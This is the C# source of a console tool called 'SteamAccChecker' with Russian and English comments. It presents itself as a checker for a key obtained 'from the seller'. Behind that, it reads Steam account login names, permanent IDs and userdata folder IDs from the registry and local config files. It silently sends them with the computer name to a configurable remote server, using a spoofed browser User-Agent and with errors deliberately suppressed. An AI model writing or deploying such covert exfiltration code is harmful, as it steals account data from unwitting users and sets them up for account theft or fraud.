using System;
using System.Text;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;

namespace SteamAccChecker
{
    class Program
    {

        public static string unique_key = null;
        public static void get_key(){
            Console.Title = "steam checker";
            Console.OutputEncoding = Encoding.UTF8;
            Console.Write("Введите уникальный ID, полученный у продавца: ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            unique_key = Console.Read().ToString();
            Console.ResetColor();
        }
        static string GetSystemArchitecture()
        {
            return Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit";
        }

        static string GetSteamPath()
        {
            string systemArchitecture = GetSystemArchitecture();
            string registryKey = systemArchitecture == "64-bit" ?
                @"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Valve\Steam" :
                @"HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam";

            string command = $@"reg query ""{registryKey}"" /v InstallPath";
            Process process = new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    FileName = "cmd",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            string regex = @"InstallPath\s+REG_SZ\s+(.+)";
            var match = Regex.Match(output, regex);

            if (match.Success && match.Groups[1].Value != "")
            {
                return match.Groups[1].Value.Trim();
            }

            return null;
        }

        static List<List<string>> ReadLoginUsersFile()
        {
            string steamPath = GetSteamPath();
            string filePath = Path.Combine(steamPath, "config", "loginusers.vdf");

            try
            {
                string fileContent = File.ReadAllText(filePath);
                string regex = @"""(\d+)""\s*{[^}]*""AccountName""\s*""([^""]+)""[^}]*}";
                var matches = Regex.Matches(fileContent, regex);

                var result = new List<List<string>>();
                foreach (Match match in matches)
                {
                    var group1 = match.Groups[1].Value;
                    var group2 = match.Groups[2].Value;
                    result.Add(new List<string> { group1, group2 });
                }

                return result;
            }
            catch (Exception error)
            {
                // Так надо, просто оставьте это.
                // Just left it there
                //Console.WriteLine("Ошибка чтения файла loginusers.vdf: " + error.Message);
                return null;
            }
        }

        static List<string> GetUserDataFolders(string steamPath)
        {
            string userDataPath = Path.Combine(steamPath, "userdata");

            try
            {
                var folders = Directory.GetDirectories(userDataPath);

                List<string> numbers = new List<string>();
                Regex regex = new Regex(@"\d+$");

                foreach (string folder in folders)
                {
                    Match match = regex.Match(folder);
                    if (match.Success)
                    {
                        numbers.Add(match.Value);
                    }
                }

                return numbers;
            }
            catch (Exception error)
            {
                Console.WriteLine("Произошла ошибка при чтении папки userdata: " + error.Message);
                return null;
            }
        }
        static void SendRequest(string computerName, List<string> permAccountIds, List<string> accountLogins, List<string> userDataFolders)
        {
            string permAccountIdsString = string.Join("\n", permAccountIds);
            string accountLoginsString = string.Join("\n", accountLogins);
            string userDataFoldersString = string.Join("\n", userDataFolders);
			
			// Вставьте вместо 'example.com' адрес вашего сервера.
			
			// Insert instead of 'example.com' your server address
			
            string url = $"http://example.com/api.php?computername={computerName}&perm_account_id={permAccountIdsString}&acc_login={accountLoginsString}&acc_ids={userDataFoldersString}&license_key={unique_key}";

            WebClient client = new WebClient();
            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36");

            try
            {
                string response = client.DownloadString(url);
            }
            catch (Exception error)
            {
                // Так надо, просто оставьте это.
                // Just left it there
                //Console.WriteLine("Возникла ошибка: " + error.Message);
            }
        }

        static void console_log(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write(message);
            Console.ResetColor();
        }

        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            get_key();
            string systemArchitecture = GetSystemArchitecture();
            string computerName = Dns.GetHostName();
            string steamPath = GetSteamPath();
            List<List<string>> loginUsers = ReadLoginUsersFile();
            Console.Write("\nИмя компьютера: " ); console_log(computerName + '\n');

            if (loginUsers != null)
            {
                List<string> userDataFolders = GetUserDataFolders(steamPath);
                List<string> permAccountIds = loginUsers.Select(user => user[0]).ToList();
                List<string> accountLogins = loginUsers.Select(user => user[1]).ToList();

                SendRequest(computerName, permAccountIds, accountLogins, userDataFolders);

                Console.Write("Перманентный(е) ID профиля(ей): "); console_log(string.Join(", ", permAccountIds) + "\n");
                Console.Write("Логин(ы) аккаунта(ов): "); console_log(string.Join(", ", accountLogins) + "\n");
                Console.Write("ID аккаунта(ов): "); console_log(string.Join(", ", userDataFolders) + "\n\n");

                Console.Write("Нажмите любую кнопку чтобы закрыть.");
                Console.ReadKey();
            }
            else
            {
                // Так надо, просто оставьте это.
                // Just left it there
                //Console.WriteLine("Ошибка чтения файла loginusers.vdf.");
            }
        }
    }
}
